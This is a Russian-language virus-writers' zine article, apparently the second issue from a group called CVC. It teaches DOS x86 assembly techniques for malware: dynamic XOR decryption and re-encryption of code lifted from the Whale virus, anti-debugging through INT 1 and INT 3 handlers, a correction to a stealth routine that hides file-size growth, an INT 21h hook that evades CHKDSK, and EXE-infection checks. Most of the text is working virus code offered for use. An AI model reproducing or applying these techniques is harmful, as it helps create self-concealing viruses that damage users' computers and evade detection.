			VIRUS WRITER'S NOTES.

	Прошло около месяца с момента выхода в свет первого выпуска
этого журнала. Необходимо отметить,  что  тот выпуск не остался не-
замеченным. На членов CVC обрушился шквал "советов и пожеланий"(Cм.
приложение).Однако, вопреки пожеланиям "доброжелателей", перед вами
второй номер...
	Рассмотрим такой безусловно полезный приём как динамическое
за-  и расшифрование.  Приведенные ниже фрагменты позаимствованы из
вируса Whale (Я надеюсь, что автор вышеуказанного вируса не обидит-
ся.). Если вы хотите больше узнать об этом вирусе, почитайте книжку
Е.Касперского или документацию к  ANTIAPE  В.Богданова, а ещё лучше
разберите сам Whale, там есть на что посмотреть...Автор рекомендует
использовать данный метод наряду с "полной" шифровкой вируса XORом.
	Начнём пожалуй. Итак фрагмент, где используются процедуры 1
и 2, выглядит так:

	       CALL  SUB_1
	Num_1  DB  XX
	Key_1  DB  YY

;	Далее зашифрованный кусочек  кода (XX байтов)
;	Последние команды зашифрованного фрагмента:
;	       СALL  SUB_2
;       Num_1_ DB  Number+1
 
        SUB_1  PROC  NEAR ;процедура расшифровки
;-----------------------------------------------
;	Сохраняем флаги, AX, BX и CX.
;-----------------------------------------------
               PUSHF					;
               POP     WORD PTR CS:[SAVED_FLAGS]	;
               MOV     WORD PTR CS:[SAVED_AX],AX	;	I
               MOV     WORD PTR CS:[SAVED_BX],BX	;
               MOV     WORD PTR CS:[SAVED_CX],CX	;
;-----------------------------------------------
               POP     BX	  ; BX указывает на NUM_1
               MOV     AX,CS:[BX] ; AH = КЕУ_1,AL = NUM_1
               ADD     BX,2
               PUSH    BX	  ; BX - адрес точки, куда передаётся
				  ; управление по выходу из процедуры.
               MOV     CX,AX
               XOR     CH,CH	  ; CL = AL, CH = 0
;------------------------------------------------
;	Расшифровываем...
;------------------------------------------------
       LOOP_1:
               XOR     CS:[BX],AH
               INC     BX
               LOOP    LOOP_1
;------------------------------------------------
;	Восстанавливаем AX, BX, CX и флаги
;------------------------------------------------
               MOV     AX,WORD PTR CS:[SAVED_AX]	;
               MOV     BX,WORD PTR CS:[SAVED_BX]	;
               MOV     CX,WORD PTR CS:[SAVED_CX]	;	II
               PUSH    WORD PTR CS:[SAVED_FLAGS]	;
               POPF					;
;------------------------------------------------
               RET
        SUB_1  ENDP

        SUB_2  PROC    NEAR
;------------------------------------------------
               PUSHF					;
               POP     WORD PTR CS:[SAVED_FLAGS]	;
               MOV     WORD PTR CS:[SAVED_AX],AX	;	I
               MOV     WORD PTR CS:[SAVED_BX],BX	;
               MOV     WORD PTR CS:[SAVED_CX],CX	;
;------------------------------------------------
;	Вычисление адреса Num_1
;------------------------------------------------
               POP     BX
               MOV     CL,CS:[BX] ; CL = Num_1_
               XOR     CH,CH
               INC     BX
               PUSH    BX	; BX = адрес возврата
               MOV     AX,1
               ADD     AX,CX
               SUB     BX,AX	; BX = @Num_1
;------------------------------------------------
        LOC_1:
               IN      AL,40H	; AL = почти случайное число
               OR      AL,AL	; с 0 не XORим
               JZ      LOC_1
;------------------------------------------------
;	Двигаем в Key_1 новое значение
;------------------------------------------------
               MOV     CX,CS:[BX]
               XOR     CH,CH
               INC     BX
               MOV     CS:[BX],AL
;------------------------------------------------
;	Шифруем...
;------------------------------------------------
       LOOP_2:
               INC     BX
               XOR     CS:[BX],AL
               LOOP    LOOP_2
;-----------------------------------------------
               MOV     AX,WORD PTR CS:[SAVED_AX]	;
               MOV     BX,WORD PTR CS:[SAVED_BX]	;
               MOV     CX,WORD PTR CS:[SAVED_CX]	;	II
               PUSH    WORD PTR CS:[SAVED_FLAGS]	;
               POPF					;
;-----------------------------------------------
               RET
        SUB_2  ENDP

	Части I и II можно выделить в отдельные процедуры. Кроме того,
данный приём будет куда изящнее, если вызывать не процедуры расшифров-
ки и зашифровки,  а скажем INT 3 и INT 1 с соответствующими обработчи-
ками этих прерываний. Это послужит отличным  (от других) противодейст-
вием отладчикам.Однако, не стоит злоупотреблять данным методом, потому
что слишком частые вызовы процедур  1 и 2 приведут к значительному за-
медлению работы компьютера, что послужит демаскирующим фактором.

	Внимание!  В первом выпуске в статье про маскировку была допу-
щена досадная ошибка (метод работал, но приращение длин файлов,не име-
ющих никаких атрибутов, не маскировалось). Для исправления этой неточ-
ности достаточто заменить команды:
		TEST BYTE PTR ES:[BX+15h],11100111b
		JZ   ERROR
На команды:
		TEST BYTE PTR ES:[BX+15h],00011000b
		JNZ  ERROR  

	Ещё несколько советов (кто не хочет, может не читать):
	-----------------------------------------------------
1. Если вы пишите вирус, маскирующий изменение длин файлов (См. первый
   выпуск журнала), добавьте "защиту" от CHKDSK.EXE (эта программа при
   наличии в памяти  стелс-вируса  выдаёт сообщение о массе потерянных
   кластеров). Это можно сделать так:

;---------------------------------------------------------------------
;		Вирусный обработчик INT 21h
;---------------------------------------------------------------------
		СMP	AH,4Bh
		JE	CHECK
;---------------------------------------------------------------------
;		Другие обрабатываемые функции
;---------------------------------------------------------------------
		CMP	BYTE PTR CS:[CHK],0FFh ; По смещению  СHK  на-
					       ; ходится байт, исполь-
					       ; зуемый как индикатор.
		JE	AWAY
		CMP	AH,11h
		JE	HIDE_1
		CMP	AH,12h
		JE	HIDE_1
		CMP	AH,4Eh
		JE	HIDE_2
		CMP	AH,4Fh
		JE	HIDE_2
AWAY:
;-----------------------------------------------------------------------
;		Передача управления на DOSовский обработчик INT 21h
;-----------------------------------------------------------------------
CHECK:
		MOV	BYTE PTR CS:[CHK],0
		CALL	INDICATE	; Процедура  INDICATE возвращает
					; CF установленным,если исполня-
					; ется СHKDSK, иначе CF сброшен.
					; Её напишите сами!
		JNC	MORE
		MOV     BYTE PTR CS:[CHK],0FFh
MORE:
;-----------------------------------------------------------------------
;		Дальнейшая обработка функции 4Вh
;-----------------------------------------------------------------------

2. НЕ давайте повода называть ваш вирус безграмотным!   Если он заражает
   EXE, то НЕ ТРОГАЙТЕ сегментированные и НЕ БЕРИТЕ длину из заголовка.
   Как отличить сегментированные?  Подсмотрим это в вирусе SVC-4644 (хо-
   роший вирус!):
;-----------------------------------------------------------------------
;		BX = handle, заражаемого EXE файла
;-----------------------------------------------------------------------
		MOV	AX,4202h
		XOR	CX,CX
		XOR	DX,DX
		INT	21h
		PUSH	DX
		PUSH	AX
		MOV	SI,200h
		DIV	SI
		DEC	AX
		CMP	AX,WORD PTR CS:[HEADER+04] ; По смещению HEADER-
						   ; считанный заголовок
						   ; данного EXE файла.
		POP	AX
		POP	DX
		JA	AWAY	; Не трогаем!!!
;-----------------------------------------------------------------------